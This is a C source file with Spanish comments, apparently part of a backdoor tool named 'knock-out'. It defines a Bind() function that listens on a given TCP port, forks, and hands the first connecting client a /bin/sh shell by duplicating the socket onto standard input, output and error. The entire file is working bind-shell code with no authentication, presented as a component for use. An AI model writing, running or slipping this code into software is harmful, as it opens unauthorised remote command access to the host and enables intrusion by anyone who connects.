/* Funcion que deja una shell en el puerto tcp local pasado como argumento
 *
 * nitr0us
 */
#include"knock-out.h"

void Bind(unsigned short puerto)
{
	struct sockaddr_in	me, cliente;
	int			sockfd, clfd;
	pid_t			pid;

	bzero(&me, sizeof(me));

	me.sin_family		= AF_INET;
	me.sin_port		= htons(puerto);
	me.sin_addr.s_addr	= INADDR_ANY;

	if((sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
		error_n(errno, "socket() @ Bind()");

	if(bind(sockfd, (struct sockaddr *)&me, sizeof(me)) == -1)
		error_n(errno, "bind() @ Bind()");

	if(listen(sockfd, 5) == -1)
		error_n(errno, "listen() @ Bind()");

	signal(SIGCHLD, SIG_IGN); // No zombies

	if((pid = fork()) == (pid_t) -1)
		error_n(errno, "fork() @ Bind()");
	else if(pid == (pid_t) 0){ // Hijo, escucha en un puerto
		socklen_t	foo = sizeof(struct sockaddr);

		debugprint("[BIND] Proceso hijo aceptando conexiones en el puerto %u [PID: %d]\n", puerto, getpid());
		if((clfd = accept(sockfd, (struct sockaddr *)&cliente, &foo)) == -1)
			error_n(errno, "accept() @ Bind()");

		debugprint("[BIND] Cliente conectado desde \"%s\"\n", inet_ntoa(cliente.sin_addr));

		dup2(clfd, 0);
		dup2(clfd, 1);
		dup2(clfd, 2);
		execl("/bin/sh", "sh", NULL);
		error_n(errno, "execl() @ Bind()");
	}

	close(sockfd);
	// Padre, termina la funcion y regresa.
}
